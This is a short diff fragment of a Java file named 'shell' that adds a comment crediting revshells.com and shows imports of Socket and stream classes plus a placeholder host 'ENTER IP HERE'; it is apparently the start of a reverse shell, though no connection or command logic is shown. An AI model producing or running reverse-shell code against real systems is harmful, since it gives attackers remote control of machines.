@@ -1,7 +1,7 @@
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
-
+// taken from https://www.revshells.com/
 public class shell {
     public static void main(String[] args) {
         String host = "ENTER IP HERE";
